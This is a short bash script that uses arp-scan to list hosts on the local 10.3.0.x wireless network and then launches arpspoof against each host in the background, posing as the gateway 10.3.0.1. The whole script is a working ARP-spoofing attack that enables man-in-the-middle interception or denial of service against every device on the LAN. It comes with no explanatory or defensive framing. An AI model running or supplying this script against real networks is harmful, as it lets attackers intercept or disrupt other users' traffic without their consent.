 
echo "Enter range start address and netmask"
start=10.3.0.1
netmask=255.255.255.0
arp-scan --interface=wlan0 --localnet | cat > active_hosts
cat < active_hosts | grep 10.3. > ips
(wc -l ips) | cat > coun
cat coun | awk '{print $1}' |cat > a
read n<a
echo $n
awk '{print $1}' ips | cat > selected_ips
for i in $(seq 2 $n)
do
  awk NR==$i selected_ips | cat > b
  read b < b
  echo $b
  
  arpspoof -i wlan0 -t $b 10.3.0.1 &
  
  ls
done



